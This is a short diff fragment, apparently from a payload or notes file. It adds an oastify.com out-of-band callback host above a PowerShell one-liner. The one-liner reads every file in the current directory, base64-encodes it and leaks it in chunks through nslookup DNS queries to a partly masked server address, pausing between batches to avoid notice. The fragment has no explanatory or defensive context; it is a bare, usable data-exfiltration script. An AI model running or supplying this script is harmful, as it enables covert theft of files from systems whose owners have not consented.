@@ -1,3 +1,5 @@
+cp5u46xv0xk96ii9kipl8ufwxn3er4ft.oastify.com
+
 $d="89.xxxx"; $s=4; $b=45; Get-ChildItem "." | Foreach-Object {$a=$_.Name; $z = [System.IO.File]::ReadAllBytes($_.FullName); $e = [System.Convert]::ToBase64String($z); $l=$e.Length; $r=""; $n=0; while ($n -le ($l/$b)) { $c=$b; if (($n*$b)+$c -gt $l) { $c=$l-($n*$b) }; $r+=$e.Substring($n*$b, $c) + "-."; if (($n%$s) -eq ($s-1)) { nslookup -type=A $r$a. $d; Start-Sleep -Seconds 10; $r="" } $n=$n+1 } nslookup -type=A $r$a. $d }
 
 ---------
